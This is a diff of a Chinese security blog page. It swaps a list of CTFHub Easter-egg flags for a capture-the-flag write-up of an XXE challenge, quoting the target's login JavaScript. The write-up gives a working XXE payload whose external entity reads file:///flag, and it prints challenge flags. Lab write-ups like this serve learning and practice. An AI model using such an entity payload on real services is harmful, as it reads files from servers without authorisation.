@@ -290,28 +290,49 @@
         
           <header class="entry-header">
             <h1 class="entry-title"></h1>
-            <p class="entry-census">&nbsp;·&nbsp;2022-8-28&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+            <p class="entry-census">&nbsp;·&nbsp;2022-8-29&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
 
             <hr>
           </header>
         
         <div class="entry-content">
-          <h1 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h1><p>一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页limit都是12 但offset在变化<br>于是<br><img src="https://img-blog.csdnimg.cn/0b4b33ac483e49a9945a279bd42d7cd8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这样设置参数<br><img src="https://img-blog.csdnimg.cn/f9fc1f1792d84ca193c1ac4910dfce25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在长度为1000到6、7千左右随便一个双击后 ==点击响应== 看==响应==包<br><img src="https://img-blog.csdnimg.cn/92c81d3b913d4800a9c19030d3079d7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在最后一行</p>
-<h1 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h1><p><a href="https://api.ctfhub.com" target="_blank" rel="noopener">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src="https://img-blog.csdnimg.cn/42334be7914f498c96d55daecf1f09fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h1><p>在web-ssrf中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838" target="_blank" rel="noopener">ctfhub-ssrf</a>post最后一行介绍</p>
-<h1 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h1><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
-<blockquote>
-<p>彩蛋    关键词    egg    ctfhub    CTFHub    拿来把你    CTFer 自己人 ……</p>
-</blockquote>
-<p>到底没想到竟然是flag</p>
-<h1 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h1><p>只找到了前半部分<br>分别在题目提交和wp提交页面的最后</p>
-<pre><code class="css">ctfhub{029e02eb3a1
-    e8c49b1132b5
-    15b652a5f3a8
-    62013}
+          <h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码    </p>
+<pre><code class="js">onclick=&quot;XMLFunction()&quot;
 </code></pre>
-<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢anweilx的<a href="https://www.cnblogs.com/anweilx/p/12493000.html" target="_blank" rel="noopener">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜==奖励== 在上面那行一个是base64然后再转url 一个是hex解码<br>第三行是俩页面的图片隐写 丢进winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/" target="_blank" rel="noopener">解码</a></p>
-<h1 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h1><p>剩余皆可在对应页面搜索egg即可获得</p>
+<p><img src="https://img-blog.csdnimg.cn/5db2cfc89d444078a9eb3b1c0d013582.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">抓包看xml格式<br><img src="https://img-blog.csdnimg.cn/f0d808b8650248d5829499816debc6de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
+<pre><code class="js">&lt;script type=&quot;text/javascript&quot;&gt;
+        function XMLFunction(){
+            var xml = &#39;&#39; +
+                &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#39; +
+            &#39;&lt;root&gt;&#39; +
+            &#39; &lt;username&gt;&#39; + $(&#39;#username&#39;).val() + &#39;&lt;/username&gt;&#39; +
+            &#39; &lt;password&gt;&#39; + $(&#39;#password&#39;).val() + &#39;&lt;/password&gt;&#39; +
+            &#39; &lt;/root&gt;&#39;;
+            var xmlhttp = new XMLHttpRequest();
+            xmlhttp.onreadystatechange = function () {
+                if(xmlhttp.readyState == 4){
+                    console.log(xmlhttp.readyState);
+                    console.log(xmlhttp.responseText);
+                    alert(xmlhttp.responseText);
+
+                }
+            }
+            xmlhttp.open(&quot;POST&quot;,&quot;login.php&quot;,true);
+            xmlhttp.send(xml);
+        };
+    &lt;/script&gt;
+</code></pre>
+<p>构造xxe攻击<br><img src="https://img-blog.csdnimg.cn/47c06ac5625149b68b8b8f6a5c7ed1b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是post包==传的时候记得把注释删去==</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;&lt;!--构造实体--&gt;
+]&gt;
+&lt;root&gt;
+&lt;username&gt;&amp;flag;&lt;/username&gt;&lt;!--输出flag实体--&gt;
+&lt;password&gt;2333&lt;/password&gt;
+&lt;/root&gt;
+</code></pre>
+<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
 
         </div>
         <!-- .entry-content -->
@@ -340,28 +361,11 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2022/08/免密ssh登录/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                </h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2022/08/hello-world/" rel="next">
+            <a href="/2022/08/xsslab/" rel="next">
               <div class="background">
                 <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
@@ -369,7 +373,7 @@
               Next Post</span>
               <div class="info">
                 <h3>
-                Hello World</h3>
+                </h3>
                 <hr>
               </div>
             </a>
